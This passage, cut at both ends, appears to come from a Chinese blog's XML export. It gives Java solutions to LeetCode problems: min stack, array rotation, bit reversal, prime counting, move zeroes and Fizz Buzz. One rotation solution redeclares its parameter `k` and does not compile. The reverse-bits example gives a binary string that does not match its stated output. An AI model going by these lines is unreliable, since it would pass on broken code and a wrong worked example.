<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借用Java自带的Stack，使用一个辅助栈，保存当前最小元素。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Stack&lt;Integer&gt; data;</span><br><span class="line">	<span class="keyword">private</span> Stack&lt;Integer&gt; helper;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MinStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		data = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">		helper = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		data.add(x);</span><br><span class="line">		<span class="keyword">if</span> (helper.isEmpty() || helper.peek() &gt;= x) &#123;</span><br><span class="line">			helper.add(x);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!data.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">int</span> top = data.pop();</span><br><span class="line">			<span class="keyword">if</span> (top == helper.peek()) &#123;</span><br><span class="line">				helper.pop();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!data.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">return</span> data.peek();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"栈中元素为空，此操作非法"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!helper.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">return</span> helper.peek();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"栈中元素为空，此操作非法"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>在遇到比min更小的值时，才把min入栈</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">	Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// only push the old minimum value when the current</span></span><br><span class="line">		<span class="comment">// minimum value changes after pushing the new value x</span></span><br><span class="line">		<span class="keyword">if</span> (x &lt;= min) &#123;</span><br><span class="line">			stack.push(min);</span><br><span class="line">			min = x;</span><br><span class="line">		&#125;</span><br><span class="line">		stack.push(x);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// if pop operation could result in the changing of the current minimum</span></span><br><span class="line">		<span class="comment">// value,</span></span><br><span class="line">		<span class="comment">// pop twice and change the current minimum value to the last minimum</span></span><br><span class="line">		<span class="comment">// value.</span></span><br><span class="line">		<span class="keyword">if</span> (stack.pop() == min)</span><br><span class="line">			min = stack.pop();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> stack.peek();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> min;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>189. 旋转数组</title>
    <url>/2020/03/26/LeetCode/leetcode-000189-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组，将数组中的元素向右移动 <em>k</em> 个位置，其中 <em>k</em> 是非负数。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>] 和 k = <span class="number">3</span></span><br><span class="line">输出: [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">解释:</span><br><span class="line">向右旋转 <span class="number">1</span> 步: [<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">向右旋转 <span class="number">2</span> 步: [<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">向右旋转 <span class="number">3</span> 步: [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [-<span class="number">1</span>,-<span class="number">100</span>,<span class="number">3</span>,<span class="number">99</span>] 和 k = <span class="number">2</span></span><br><span class="line">输出: [<span class="number">3</span>,<span class="number">99</span>,-<span class="number">1</span>,-<span class="number">100</span>]</span><br><span class="line">解释: </span><br><span class="line">向右旋转 <span class="number">1</span> 步: [<span class="number">99</span>,-<span class="number">1</span>,-<span class="number">100</span>,<span class="number">3</span>]</span><br><span class="line">向右旋转 <span class="number">2</span> 步: [<span class="number">3</span>,<span class="number">99</span>,-<span class="number">1</span>,-<span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。</li>
<li>要求使用空间复杂度为 O(1) 的 <strong>原地</strong> 算法。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h2 id="解法一：使用额外的数组-不符合题目要求"><a href="#解法一：使用额外的数组-不符合题目要求" class="headerlink" title="解法一：使用额外的数组(不符合题目要求)"></a>解法一：使用额外的数组(不符合题目要求)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (nums.length &lt; <span class="number">2</span> || k &lt; <span class="number">1</span> || k % nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k &gt; nums.length) &#123;</span><br><span class="line">            k = k % nums.length;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span>[] newNums = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; k;i++) &#123;</span><br><span class="line">        	newNums[i] = nums[nums.length - k + i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = k,j = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	newNums[i] = nums[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	nums[i] = newNums[i];</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：暴力破解"><a href="#解法二：暴力破解" class="headerlink" title="解法二：暴力破解"></a>解法二：暴力破解</h3><p>每次旋转一个数字，旋转k个即可。这里有个坑，K的值是有可能比数组的长度大的，所以，在循环处理之前，需要对k取余。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> k = k % nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; k;i++) &#123;</span><br><span class="line">        	rotate(nums);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> temp = nums[nums.length - <span class="number">1</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = nums.length - <span class="number">1</span>;i &gt; <span class="number">0</span>;i--) &#123;</span><br><span class="line">			nums[i] = nums[i - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		nums[<span class="number">0</span>] = temp;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：翻转数组"><a href="#解法三：翻转数组" class="headerlink" title="解法三：翻转数组"></a>解法三：翻转数组</h3><p>假设对数组[1,2,3,4,5,6,7]，需要对k=3进行旋转。</p>
<p>那么我们先把这个数组翻转得到[7,6,5,4,3,2,1].</p>
<p>接着对前k个数字进行翻转，得到[5,6,7,4,3,2,1]</p>
<p>最后，对剩下的数字进行翻转，得到[5,6,7,1,2,3,4]</p>
<p>亦或是</p>
<p>先翻转前length - k 个，得到[4,3,2,1,5,6,7]</p>
<p>在翻转后k个，得到[4,3,2,1,7,6,5]</p>
<p>最后翻转整个数组，得到[5,6,7,1,2,3,4]</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.length &lt; <span class="number">2</span> || k &lt; <span class="number">1</span> || k % nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k &gt; nums.length) &#123;</span><br><span class="line">            k = k % nums.length;</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(nums, <span class="number">0</span>, nums.length - <span class="number">1</span> - k);</span><br><span class="line">        reverse(nums, nums.length - k, nums.length -<span class="number">1</span>);</span><br><span class="line">        reverse(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = nums[start];</span><br><span class="line">            nums[start++] = nums[end];</span><br><span class="line">            nums[end--] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h2><p>参考的<a href="https://leetcode-cn.com/problems/rotate-array/solution/xuan-zhuan-shu-zu-by-leetcode/" target="_blank" rel="noopener">LeetCode官方题解</a></p>
<p>如果我们直接把每一个数字放到它最后的位置，但这样的后果是遗失原来的元素。因此，我们需要把被替换的数字保存在变量 temptemptemp 里面。然后，我们将被替换数字（temptemptemp）放到它正确的位置，并继续这个过程 nnn 次， nnn 是数组的长度。这是因为我们需要将数组里所有的元素都移动。但是，这种方法可能会有个问题，如果 n%k==0n%k==0n%k==0，其中 k=k%nk=k%nk=k%n （因为如果 kkk 大于 nnn ，移动 kkk 次实际上相当于移动 k%nk%nk%n 次）。这种情况下，我们会发现在没有遍历所有数字的情况下回到出发数字。此时，我们应该从下一个数字开始再重复相同的过程。</p>
<p>现在，我们看看上面方法的证明。假设，数组里我们有 nnn 个元素并且 kkk 是要求移动的次数。更进一步，假设 n%k=0n%k=0n%k=0 。第一轮中，所有移动数字的下标 iii 满足 i%k==0i%k==0i%k==0 。这是因为我们每跳 kkk 步，我们只会到达相距为 kkk 个位置下标的数。每一轮，我们都会移动 nk\frac{n}{k}kn 个元素。下一轮中，我们会移动满足 i%k==1i%k==1i%k==1 的位置的数。这样的轮次会一直持续到我们再次遇到 i%k==0i%k==0i%k==0 的地方为止，此时 i=ki=ki=k 。此时在正确位置上的数字共有 k×nk=nk \times \frac{n}{k}=nk×kn=n 个。因此所有数字都在正确位置上。</p>
<p>让我们看一下接下来的例子，以更好地说明这个过程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">nums: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">k: <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://pic.leetcode-cn.com/f0493a97cdb7bc46b37306ca14e555451496f9f9c21effcad8517a81a26f30d6-image.png" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        k = k % nums.length;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> start = <span class="number">0</span>; count &lt; nums.length; start++) &#123;</span><br><span class="line">            <span class="keyword">int</span> current = start;</span><br><span class="line">            <span class="keyword">int</span> prev = nums[start];</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> next = (current + k) % nums.length;</span><br><span class="line">                <span class="keyword">int</span> temp = nums[next];</span><br><span class="line">                nums[next] = prev;</span><br><span class="line">                prev = temp;</span><br><span class="line">                current = next;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">while</span> (start != current);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>190. 颠倒二进制位</title>
    <url>/2020/03/26/LeetCode/leetcode-000190-%E9%A2%A0%E5%80%92%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>颠倒给定的 32 位无符号整数的二进制位。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 00000010100101000001111010011100</span><br><span class="line">输出: 00111001011110000010100101000000</span><br><span class="line">解释: 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596，</span><br><span class="line">      因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">11111111111111111111111111111101</span></span><br><span class="line">输出：<span class="number">10111111111111111111111111111111</span></span><br><span class="line">解释：输入的二进制串 <span class="number">11111111111111111111111111111101</span> 表示无符号整数 <span class="number">4294967293</span>，</span><br><span class="line">      因此返回 <span class="number">3221225471</span> 其二进制表示形式为 <span class="number">10101111110010110010011101101001</span>。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><p>请注意，在某些语言（如 Java）中，没有无符号整数类型。在这种情况下，输入和输出都将被指定为有符号整数类型，并且不应影响您的实现，因为无论整数是有符号的还是无符号的，其内部的二进制表示形式都是相同的。<br>在 Java 中，编译器使用二进制补码记法来表示有符号整数。因此，在上面的 示例 2 中，输入表示有符号整数 -3，输出表示有符号整数 -1073741825。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助StringBuilder，翻转字符串，不足32位的情况下，后面补0</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(Integer.toBinaryString(n)).reverse();</span><br><span class="line">        <span class="keyword">int</span> length = <span class="number">32</span> - sb.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            sb.append(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.parseUnsignedInt(sb.toString(), <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>依次将n的末尾位给result的末尾位，并且result向左移31次</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = n &amp; <span class="number">0x01</span>;</span><br><span class="line">            n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            result = (result &lt;&lt; <span class="number">1</span>) | temp;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">31</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">            count = (n &gt;&gt;&gt; i &amp; <span class="number">1</span>) &lt;&lt; (<span class="number">31</span>-i) | count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/RBreeze/article/details/81393245" target="_blank" rel="noopener">LeetCode——第190题：颠倒二进制位</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>204. 计数质数</title>
    <url>/2020/03/26/LeetCode/leetcode-000204-%E8%AE%A1%E6%95%B0%E8%B4%A8%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>统计所有小于非负整数 <em>n</em> 的质数的数量。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: 4</span><br><span class="line">解释: 小于 10 的质数一共有 4 个, 它们是 2, 3, 5, 7 。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：筛法求素数"><a href="#解法一：筛法求素数" class="headerlink" title="解法一：筛法求素数"></a>解法一：筛法求素数</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countPrimes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">boolean</span>[] isPrim = <span class="keyword">new</span> <span class="keyword">boolean</span>[n];</span><br><span class="line">	    Arrays.fill(isPrim, <span class="keyword">true</span>);</span><br><span class="line">	    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i * i &lt; n; i++) </span><br><span class="line">	        <span class="keyword">if</span> (isPrim[i]) </span><br><span class="line">	            <span class="keyword">for</span> (<span class="keyword">int</span> j = i * i; j &lt; n; j += i) </span><br><span class="line">	                isPrim[j] = <span class="keyword">false</span>;</span><br><span class="line">	    </span><br><span class="line">	    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++)</span><br><span class="line">	        <span class="keyword">if</span> (isPrim[i]) count++;</span><br><span class="line">	    </span><br><span class="line">	    <span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>283. 移动零</title>
    <url>/2020/03/26/LeetCode/leetcode-000283-%E7%A7%BB%E5%8A%A8%E9%9B%B6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组 <code>nums</code>，编写一个函数将所有 <code>0</code> 移动到数组的末尾，同时保持非零元素的相对顺序。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [0,1,0,3,12]</span><br><span class="line">输出: [1,3,12,0,0]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：快慢指针"><a href="#解法一：快慢指针" class="headerlink" title="解法一：快慢指针"></a>解法一：快慢指针</h3><p>使用快慢指针。i-慢指针指向数组首位，j-快指针遍历数组，遇到不为0的数据，就将该数据移到i处，i自增</p>
<p>最后将i-nums.length区间内的数据全置为0，即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[j] != <span class="number">0</span>) &#123;</span><br><span class="line">				nums[i++] = nums[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> (i &lt; nums.length) &#123;</span><br><span class="line">			nums[i++] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法二：快慢指针优化"><a href="#解法二：快慢指针优化" class="headerlink" title="解法二：快慢指针优化"></a>解法二：快慢指针优化</h2><p>在上一个解法中，遇到不为0的数据时不仅仅只移动一个位置，而是把两个位置交换，这样就可以略去i-nums.length的再次遍历了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[j] != <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">int</span> temp = nums[j];</span><br><span class="line">				nums[j] = nums[i];</span><br><span class="line">				nums[i] = temp;</span><br><span class="line">				i++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>412. Fizz Buzz</title>
    <url>/2020/03/26/LeetCode/leetcode-000412.%20Fizz%20Buzz/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>写一个程序，输出从 1 到 n 数字的字符串表示。</p>
<ol>
<li><p>如果 n 是3的倍数，输出“Fizz”；</p>
</li>
<li><p>如果 n 是5的倍数，输出“Buzz”；</p>
</li>
</ol>
<p>3.如果 n 同时是3和5的倍数，输出 “FizzBuzz”。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; 15,</span><br><span class="line"></span><br><span class="line">返回:</span><br><span class="line">[</span><br><span class="line">    &quot;1&quot;,</span><br><span class="line">    &quot;2&quot;,</span><br><span class="line">    &quot;Fizz&quot;,</span><br><span class="line">    &quot;4&quot;,</span><br><span class="line">    &quot;Buzz&quot;,</span><br><span class="line">    &quot;Fizz&quot;,</span><br><span class="line">    &quot;7&quot;,</span><br><span class="line">    &quot;8&quot;,</span><br><span class="line">    &quot;Fizz&quot;,</span><br><span class="line">    &quot;Buzz&quot;,</span><br><span class="line">    &quot;11&quot;,</span><br><span class="line">    &quot;Fizz&quot;,</span><br><span class="line">    &quot;13&quot;,</span><br><span class="line">    &quot;14&quot;,</span><br><span class="line">    &quot;FizzBuzz&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>无。注意3和15的公倍数，不要多输出即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">fizzBuzz</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (i % <span class="number">15</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        		result.add(<span class="string">"FizzBuzz"</span>);</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i % <span class="number">3</span> == <span 